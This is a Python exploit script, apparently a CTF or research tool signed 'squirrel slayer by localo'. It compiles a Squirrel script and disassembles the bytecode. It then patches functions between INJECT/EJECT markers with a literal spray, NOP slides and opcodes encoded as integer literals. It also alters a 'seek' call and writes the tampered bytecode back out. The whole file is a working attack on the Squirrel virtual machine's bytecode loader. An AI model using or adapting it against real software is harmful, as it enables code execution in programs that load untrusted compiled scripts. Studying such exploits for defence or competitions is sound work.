import assembler as asm
import disassembler as dism
from sqdef import *
import struct
import os

DEBUG = True
step = 40

def get_fn(base,name):
    if base.function_name == name:
        return base
    for fn in base.functions:
        f = get_fn(fn,name)
        if f:
            return f
    return None

def r_apply(base,fn):
    fn(base)
    for f in base.functions:
        r_apply(f,fn)

def split_injection(fn):
    inj_idx = -1
    ej_idx = -1
    for idx, ins in enumerate(fn.instructions):
        if op2name[ins.op] == "LOAD":
            if fn.literals[ins.arg1] == (tmap['OT_STRING'], "INJECT"):
                inj_idx = idx
            elif fn.literals[ins.arg1] == (tmap['OT_STRING'], "EJECT"):
                ej_idx = idx
    if inj_idx == -1 or ej_idx == -1:
        return None, None, None
    return fn.instructions[:inj_idx],fn.instructions[ej_idx+1:], fn.instructions[inj_idx+1:ej_idx]

if __name__ == "__main__":
    os.system(r"./squirrel/bin/sq.exe -c -o test.cnut test.nut")
    
    with open("test.cnut","rb") as f:
        data = f.read()

    f = dism.SQFile(data)
    f.parse()

    stack_up = get_fn(f.main,"stack_up")
    if stack_up:
        print(stack_up)
        print("[*] patching stack_up function")
        #def fn(x):
        #    x.stack_size = -0xFFFFFFF
        #r_apply(f.main,fn)
        
        


    ip2st_fn = get_fn(f.main,"ip2st")
    if ip2st_fn:
        print("[*] patching ip2st function")
        before, after, between = split_injection(ip2st_fn)
        target = -1
        for ins in before:
            if op2name[ins.op] == "LOAD":
                target = ins.arg0
        if target == -1:
            print("[!] target not found")
            exit(1)
        search_offset = 0x400
        n = 8000//step
        ip2st_fn.literals=[(tmap['OT_INTEGER'],0x1337414243441337)]*step
        ip2st_fn.literals.append((tmap['OT_STRING'],"r"))
        ip2st_fn.literals.append((tmap['OT_STRING'],"cmp"))
        pre="""
        PUSHTRAP a0:0x00 a1:%x a2: 0x00 a3:0x00
        """%(n*2)
        before+=asm.parse_assembly(pre)
        if len(before)%2==1:
            before=asm.parse_assembly("LINE a0: 0x00 a1:0x00 a2:0x00 a3:0x00")+before
        assembly=""
        for x in range(n):
            assembly+="""
            NE          a0: %x a1:%x a2:%x   a3:0x00
            JZ          a0: %x a1:%x a2:0x00 a3:0x00
            """ % (target+1,search_offset+x*step,target,
                    target+1,-((search_offset+x*step)*2-step-(step+(n-x)*2 + len(before)))
                )
        ip2st_fn.instructions = before+asm.parse_assembly(assembly)+after
    
    load_opcodes_fn = get_fn(f.main,"load_opcodes")
    if load_opcodes_fn:
        print("[*] patching load_opcodes")
        slide = step*2
        before, after, between = split_injection(load_opcodes_fn)
        #NOP SLIDE
        load_opcodes_fn.literals.append((tmap['OT_INTEGER'],0x0))
        assembly=""
        for idx in range(slide):
            assembly+="""
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            """%(idx,len(load_opcodes_fn.literals)-1)
        idx = slide

        hacks = """
        LOADROOT    a0: 0x00 a1: 0x00 a2:0x00 a3:0x00
        LOAD        a0: 0x01 a1: %x   a2:0x00 a3:0x00
        GET         a0: 0x02 a1: 0x00 a2:0x01 a3:0x00
        ADD         a0: %x   a1: %x   a2:0x02 a3:0x00
        MOVE        a0: 0x02 a1: 0x00 a2:0x00 a3:0x00
        SET         a0: 0xFF a1: 0x00 a2:0x01 a3:0x02
        LOADINT     a0: 0x03 a1: 0x42 a2:0x00 a3:0x00
        THROW       a0: 0x03 a1: 0x00 a2:0x00 a3:0x00
        """%(step,idx+2,idx+2)
        for ins in asm.parse_assembly(hacks):
            load_opcodes_fn.literals.append((tmap['OT_INTEGER'],int.from_bytes(struct.pack("iBBBB",ins.arg1, ins.op,ins.arg0,ins.arg2,ins.arg3),'little')))
            assembly+="""
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            """%(idx,len(load_opcodes_fn.literals)-1)
            idx+=1
        
        load_opcodes_fn.instructions=before+asm.parse_assembly(assembly)+after


    load_opcodes_lit_fn = get_fn(f.main,"load_opcodes_lit")
    if load_opcodes_lit_fn:
        print("[*] patching load_opcodes_lit")

        slide = step*2
        before, after, between = split_injection(load_opcodes_lit_fn)
        #NOP SLIDE
        load_opcodes_lit_fn.literals.append((tmap['OT_INTEGER'],0x0))
        assembly=""
        for idx in range(slide):
            assembly+="""
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            """%(idx,len(load_opcodes_lit_fn.literals)-1)
        idx = slide

        hacks = """
        LOADROOT    a0: 0x00 a1: 0x00 a2:0x00 a3:0x00
        LOAD        a0: 0x01 a1: %x   a2:0x00 a3:0x00
        GET         a0: 0x02 a1: 0x00 a2:0x01 a3:0x00
        ADD         a0: %x   a1: %x   a2:0x02 a3:0x00
        LOAD        a0: 0x02 a1: 0x00 a2:0x00 a3:0x00
        SET         a0: 0xFF a1: 0x00 a2:0x01 a3:0x02
        LOADINT     a0: 0x03 a1: 0x42 a2:0x00 a3:0x00
        THROW       a0: 0x03 a1: 0x00 a2:0x00 a3:0x00
        """%(step,idx+2,idx+2)
        for ins in asm.parse_assembly(hacks):
            load_opcodes_lit_fn.literals.append((tmap['OT_INTEGER'],int.from_bytes(struct.pack("iBBBB",ins.arg1, ins.op,ins.arg0,ins.arg2,ins.arg3),'little')))
            assembly+="""
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            """%(idx,len(load_opcodes_lit_fn.literals)-1)
            idx+=1
        
        load_opcodes_lit_fn.instructions=before+asm.parse_assembly(assembly)+after


    load_opcodes_cmp_fn = get_fn(f.main,"load_opcodes_cmp")
    if load_opcodes_cmp_fn:
        print("[*] patching load_opcodes")
        slide = step*2

        before, after, between = split_injection(load_opcodes_cmp_fn)
        #NOP SLIDE
        load_opcodes_cmp_fn.literals.append((tmap['OT_INTEGER'],0x0))
        assembly=""
        for idx in range(slide):
            assembly+="""
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            """%(idx,len(load_opcodes_cmp_fn.literals)-1)
        idx = slide

        hacks = """
        LOADROOT    a0: 0x00 a1: 0x00 a2:0x00 a3:0x00
        DLOAD       a0: 0x01 a1: %x   a2:0x03 a3:%x
        GET         a0: 0x02 a1: 0x00 a2:0x01 a3:0x00
        GET         a0: 0x04 a1: 0x00 a2:0x03 a3:0x00
        ADD         a0: %x   a1: %x   a2:0x02 a3:0x00
        EQ          a0: 0x02 a1: 0x00 a2:0x04 a3:0x00
        SET         a0: 0xFF a1: 0x00 a2:0x01 a3:0x02
        LOADINT     a0: 0x03 a1: 0x42 a2:0x00 a3:0x00
        THROW       a0: 0x03 a1: 0x00 a2:0x00 a3:0x00
        """%(step,step+1,idx+3,idx+3)
        for ins in asm.parse_assembly(hacks):
            load_opcodes_cmp_fn.literals.append((tmap['OT_INTEGER'],int.from_bytes(struct.pack("iBBBB",ins.arg1, ins.op,ins.arg0,ins.arg2,ins.arg3),'little')))
            assembly+="""
            LOAD        a0:%x   a1:%x   a2:0x00 a3:0x00
            """%(idx,len(load_opcodes_cmp_fn.literals)-1)
            idx+=1
        
        load_opcodes_cmp_fn.instructions=before+asm.parse_assembly(assembly)+after

    pwn_fn = get_fn(f.main,"pwn")
    if pwn_fn:
        print("[*] patching pwn")
        before, after, between = split_injection(pwn_fn)
        patch = []
        target = None
        for ins in between:
            if op2name[ins.op] == "PREPCALLK" and pwn_fn.literals[ins.arg1]== (tmap['OT_STRING'],'seek'):
                target = ins.arg0
            if op2name[ins.op] == "CALL" and target and ins.arg1 == target:
                patch.extend(asm.parse_assembly("""
                MOVE    a0: %x a1: 0x02 a2:0x00 a3: 0x00
                """ % (ins.arg2)))
            patch.append(ins)
        pwn_fn.instructions = before+patch+after
        print(pwn_fn)

    f.main.sourcename="h4x"
    f.main.function_name = "squirrel slayer by localo"
    s = asm.SQFile()
    s.assemble(f.main,bytearray(0))
    with open("test.cnut","wb") as f:
        f.write(s.data)
    